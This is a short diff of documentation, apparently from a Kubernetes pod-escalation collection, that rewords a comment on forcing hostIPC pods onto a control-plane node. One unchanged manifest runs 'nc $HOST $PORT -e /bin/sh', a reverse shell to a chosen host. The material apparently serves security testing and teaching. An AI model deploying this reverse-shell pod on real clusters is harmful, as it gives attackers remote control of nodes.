@@ -19,8 +19,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
     name: hostipc
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
   ```
 [pod-hostipc.yaml](pod-hostipc.yaml)
 
@@ -54,8 +53,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     name: hostipc--revshell
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
 ```
 [pod-hostipc-revshell.yaml](pod-hostipc-revshell.yaml)
 
